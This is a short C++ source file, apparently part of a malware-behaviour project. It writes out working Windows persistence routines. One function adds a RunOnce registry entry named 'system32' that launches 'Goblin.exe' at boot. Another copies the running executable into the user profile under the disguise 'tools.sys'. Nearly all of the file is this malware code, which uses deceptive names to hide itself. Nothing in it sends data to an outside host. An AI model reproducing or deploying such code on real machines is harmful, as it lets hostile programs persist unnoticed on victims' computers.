#include "Malware_behav.h"
#include <string>
#include <Shlobj.h> 
#include <wtypes.h>

using namespace std;
// Edits the Windows registry to make the program persistent
// Based on https://docs.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys?redirectedfrom=MSDN
bool config_run_at_boot() {
	wstring this_exe = L"C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\Goblin.exe";
	HKEY hkey = NULL;
	//LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
	LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", &hkey);
	LONG status = RegSetValueEx(hkey, L"system32", 0, REG_SZ, (BYTE*)this_exe.c_str(), (this_exe.size() + 1) * sizeof(wchar_t));
	return true;
}

bool create_copy() {
	WCHAR this_user_dir[MAX_PATH + 1];
	WCHAR this_exe_path[MAX_PATH + 1];

	if (!(S_OK == SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, this_user_dir))) {
		return false;
	}
	
	// Get current program's file path
	GetModuleFileName(NULL, this_exe_path, _MAX_PATH);

	// Copy the file to it's final destination
	wcscat_s(this_user_dir, L"\\tools.sys");

	if (CopyFile(this_exe_path, this_user_dir, false)) {
		return true;
	}

	return false;
}